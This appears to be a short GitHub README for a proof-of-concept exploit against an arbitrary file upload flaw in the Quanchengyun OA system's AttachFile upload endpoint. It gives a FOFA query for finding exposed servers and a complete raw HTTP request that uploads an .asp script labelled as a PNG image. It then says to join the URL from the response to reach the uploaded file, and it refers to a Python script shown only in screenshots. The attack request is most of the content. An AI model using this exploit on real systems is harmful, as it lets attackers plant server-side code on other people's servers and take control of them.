# QCYoaUpload
全程云OAAttachFile文件上传


fofa：body="images/yipeoplehover.png"

```

POST /OA/api/2.0/Common/AttachFile/UploadFile HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close


------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Content-Disposition: form-data; name="upload"; filename="1.asp"
Content-Type: image/png

<% Response.Write("Hello, World!") %>
------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--

```

![图片](https://github.com/user-attachments/assets/ca8ce676-4251-4a15-8d45-c972f5af7d2e)

拼接响应包的网址即可

使用py文件
![图片](https://github.com/user-attachments/assets/2eb2d9b5-2e83-45df-aea7-046abb844f6c)


